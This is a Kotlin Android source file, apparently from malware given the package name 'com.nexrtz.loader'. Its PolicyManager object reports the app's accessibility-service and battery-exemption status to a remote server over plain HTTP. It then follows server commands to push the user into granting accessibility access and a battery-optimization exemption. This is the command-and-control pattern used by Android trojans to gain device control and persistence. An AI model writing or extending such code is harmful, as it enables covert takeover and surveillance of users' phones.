package com.nexrtz.loader

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.PowerManager
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

object PolicyManager {

    private const val TAG = "PolicyManager"

    fun syncWithServer(context: Context, serverIp: String) {
        thread {
            try {
                val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
                val isWhitelisted = pm.isIgnoringBatteryOptimizations(context.packageName)
                val isAccessibilityEnabled = isAccessibilityServiceEnabled(context)
                
                Log.d(TAG, "Intel Node Sync - Batt: $isWhitelisted, Acc: $isAccessibilityEnabled")

                val url = URL("http://$serverIp:5000/api/v1/policy/check")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 5000

                val statusJson = JSONObject()
                statusJson.put("is_whitelisted", isWhitelisted)
                statusJson.put("accessibility_enabled", isAccessibilityEnabled)

                OutputStreamWriter(conn.outputStream).use { it.write(statusJson.toString()) }

                if (conn.responseCode == HttpURLConnection.HTTP_OK) {
                    val responseJson = JSONObject(conn.inputStream.bufferedReader().use { it.readText() })
                    val command = responseJson.optString("command")
                    
                    when (command) {
                        "REQUIRE_ACCESSIBILITY" -> openAccessibilitySettings(context)
                        "ENFORCE_POLICY" -> triggerBatteryPrompt(context)
                    }
                }
                conn.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "Intel Policy Sync Failed", e)
            }
        }
    }

    private fun isAccessibilityServiceEnabled(context: Context): Boolean {
        val expectedService = "${context.packageName}/com.nexrtz.loader.MyAccessibilityService"
        val enabledServices = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        
        val splitter = TextUtils.SimpleStringSplitter(':')
        splitter.setString(enabledServices)
        while (splitter.hasNext()) {
            if (splitter.next().equals(expectedService, ignoreCase = true)) return true
        }
        return false
    }

    private fun openAccessibilitySettings(context: Context) {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        context.startActivity(intent)
    }

    private fun triggerBatteryPrompt(context: Context) {
        val intent = Intent().apply {
            action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
            data = Uri.parse("package:${context.packageName}")
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        context.startActivity(intent)
    }
}
